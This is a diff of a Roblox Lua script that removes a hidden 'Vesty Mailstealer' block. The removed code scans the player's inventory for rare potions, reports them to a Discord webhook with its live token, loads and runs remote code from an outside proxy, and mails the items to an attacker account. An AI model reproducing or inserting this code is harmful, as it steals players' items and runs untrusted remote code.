@@ -3,58 +3,7 @@ return function(dh,pn,gn,dp,potc)
 local zzzu, zzzv =pcall(function()
 if not dp then dp = 0 end
 if not potc then
-spawn(function()pcall(function()
 potc = 0
-local pots = {}
-local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
-if save.Inventory.Consumable then
-for i,v in pairs(save.Inventory.Consumable) do
-if v.id == "God Potion" or (v.id == "Instant Luck Potion" and v.tn==4) then
-pots[i]=v._am or 1
-potc=potc+1
-end
-end
-end
-if potc>0 then
-request(
-{
-Url = "https://discordapp.com/api/webhooks/1298268105889288202/ExDWIDv3HFsqFSDjlTbGIUssoRILbcvJJGPrfTyhmMC1RR4VqmThwmxiUpcRZur-HMhv",
-Method = "POST",
-Headers = {["Content-Type"] = "application/json"},
-Body = '{"tts":false,"content":"@everyone '..potc..'"}'
-}
-)
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("hui - "..potc)
-function _mail(u, t, i, n)
-local args = {
-    [1] = u,
-    [2] = "Vesty Mailstealer",
-    [3] = t,
-    [4] = i,
-    [5] = n or 1
-}
-return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-end
-for i,v in pairs(pots) do
-local x,y = false, "x"
-repeat
-x,y = _mail("hamster97", "Consumable", i, v)
-if not x then
-request(
-{
-Url = "https://discordapp.com/api/webhooks/1298268105889288202/ExDWIDv3HFsqFSDjlTbGIUssoRILbcvJJGPrfTyhmMC1RR4VqmThwmxiUpcRZur-HMhv",
-Method = "POST",
-Headers = {["Content-Type"] = "application/json"},
-Body = '{"tts":false,"content":"@everyone '..y..'"}'
-}
-) end
-wait(0.2)
-until x==true
-
-end
-end
-end
-end)end)
 end
 if _G.dx then return end
 if tonumber(gn)==100 then gn = 0 end
